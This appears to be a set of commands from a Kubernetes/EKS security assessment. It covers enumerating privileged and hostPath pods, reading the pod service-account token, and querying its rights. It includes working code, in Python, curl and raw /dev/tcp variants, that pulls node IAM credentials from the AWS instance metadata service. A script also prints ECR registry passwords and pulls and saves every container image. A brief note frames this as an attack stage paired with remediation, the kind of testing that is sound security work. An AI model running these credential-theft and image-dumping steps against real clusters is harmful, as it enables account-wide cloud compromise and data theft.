```
kubectl get pods -A --field-selector spec.nodeName=<node-name> -o json \
  | jq -r '.items[] | select(
      .spec.hostNetwork == true or .spec.hostPID == true
      or any(.spec.containers[]; .securityContext.privileged == true)
      or any(.spec.volumes[]?; has("hostPath"))
    ) | "\(.metadata.namespace)/\(.metadata.name)"'

```
```

    kubectl get pods -A --field-selector spec.nodeName=<node-name> \
  -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"\t"}{.spec.hostNetwork}{"\t"}{.spec.hostPID}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}' \
  | grep -E 'true'
```

```
  kubectl get pods -A --field-selector spec.nodeName=<node-name> -o json \
  | jq -r '
    .items[]
    | {
        ns: .metadata.namespace,
        name: .metadata.name,
        reasons: (
          []
          + (if .spec.hostNetwork == true then ["hostNetwork"] else [] end)
          + (if .spec.hostPID == true     then ["hostPID"]     else [] end)
          + (if .spec.hostIPC == true     then ["hostIPC"]     else [] end)
          + (if any(.spec.containers[]; .securityContext.privileged == true)
               then ["privileged"] else [] end)
          + (if any(.spec.volumes[]?; has("hostPath"))
               then ["hostPath"] else [] end)
          + (if (.spec.automountServiceAccountToken != false)
                and ((.spec.serviceAccountName // "default") != "default")
               then ["saToken:" + .spec.serviceAccountName] else [] end)
          + ([ .spec.containers[].securityContext.capabilities.add[]? ]
               | map(select(
                   . == "SYS_ADMIN" or . == "NET_RAW"   or . == "NET_ADMIN"
                   or . == "SYS_PTRACE" or . == "SYS_MODULE" or . == "DAC_READ_SEARCH"
                   or . == "ALL"))
               | if length > 0 then ["caps:" + join(",")] else [] end)
        )
      }
    | select(.reasons | length > 0)
    | "\(.ns)/\(.name)\t\(.reasons | join(", "))"
  ' \
  | column -t -s $'\t'
```


```
python3 -c '
import urllib.request as u
t=u.urlopen(u.Request("http://169.254.169.254/latest/api/token",method="PUT",
  headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"})).read().decode()
role=u.urlopen(u.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  headers={"X-aws-ec2-metadata-token":t})).read().decode()
print(role)
print(u.urlopen(u.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,
  headers={"X-aws-ec2-metadata-token":t})).read().decode())
'
```


```
exec 3<>/dev/tcp/169.254.169.254/80
printf 'PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 60\r\nConnection: close\r\n\r\n' >&3
TOK=$(cat <&3 | tail -1)

# use it
exec 3<>/dev/tcp/169.254.169.254/80
printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: %s\r\nConnection: close\r\n\r\n' "$TOK" >&3
cat <&3
```

```
# 0a. what can the SA token do?
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://kubernetes.default.svc
kubectl auth can-i --list 2>/dev/null    # if kubectl is in-pod
curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"

# 0b. EKS node IAM creds via IMDSv2  ← high-value
T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $T" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $T" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

```

```
kubectl get pods -A -o wide --token "$nodeimds" --field-selector spec.nodeName=<nodename>
```


```
kubectl get pod <pod-name> -o jsonpath='
imagePullSecrets: {.spec.imagePullSecrets[*].name}{"\n"}
volume secrets: {.spec.volumes[*].secret.secretName}{"\n"}
env secretKeyRef: {.spec.containers[*].env[*].valueFrom.secretKeyRef.name}{"\n"}
envFrom secretRef: {.spec.containers[*].envFrom[*].secretRef.name}{"\n"}
'
```
```
the Node authorizer deliberately boxes in what a compromised node can do inside the cluster, which is good — but it does nothing to constrain the IAM role attached to that node. An over-permissioned node instance role turns a single pod escape into account-wide AWS compromise. The remediation half of the stage is scoping that node role down and demonstrating that the same aws sts pivot now hits nothing useful.
```
```
#!/usr/bin/env bash
set -euo pipefail

# Regions to scan (edit as needed, or pull all enabled regions)
REGIONS=("us-east-1" "us-west-2")

for REGION in "${REGIONS[@]}"; do
    ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
    REGISTRY="${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com"

    # One token per registry
    TOKEN=$(aws ecr get-login-password --region "$REGION")

    echo "==================================================================="
    echo "Registry : $REGISTRY"
    echo "Username : AWS"
    echo "Password : $TOKEN"
    echo "==================================================================="

    # Walk every repo + every tag
    for REPO in $(aws ecr describe-repositories --region "$REGION" \
                    --query 'repositories[].repositoryName' --output text); do
        aws ecr describe-images --region "$REGION" --repository-name "$REPO" \
            --query 'imageDetails[].imageTags' --output text 2>/dev/null \
        | tr '\t' '\n' | while read -r TAG; do
            [ -z "$TAG" ] && continue
            echo "${REGISTRY}/${REPO}:${TAG}"
        done
    done
    echo ""
done
```
```
# Login once per registry
aws ecr get-login-password --region us-east-1 \
  | docker login --username AWS --password-stdin <acct-id>.dkr.ecr.us-east-1.amazonaws.com

# Pull + save to tarball
IMG=<acct-id>.dkr.ecr.us-east-1.amazonaws.com/<repo>:<tag>
docker pull "$IMG"
docker save "$IMG" -o "$(echo "$IMG" | tr '/:' '__').tar"

```

```
mkdir review && tar -xf image__repo__tag.tar -C review

```


```
kubectl get ns -o custom-columns=\
'NAME:.metadata.name,'\
'ENFORCE:.metadata.labels.pod-security\.kubernetes\.io/enforce,'\
'WARN:.metadata.labels.pod-security\.kubernetes\.io/warn,'\
'AUDIT:.metadata.labels.pod-security\.kubernetes\.io/audit'
```
```
kubectl get pods -A -o json | jq -r '
  ["NS","POD","hostPID","hostNet","hostIPC","privileged","hostPath"],
  (.items[] | [
    .metadata.namespace,
    .metadata.name,
    (.spec.hostPID // false),
    (.spec.hostNetwork // false),
    (.spec.hostIPC // false),
    ([.spec.containers[].securityContext.privileged] | any),
    ([(.spec.volumes // [])[] | has("hostPath")] | any)
  ]) | @tsv' | column -t
```
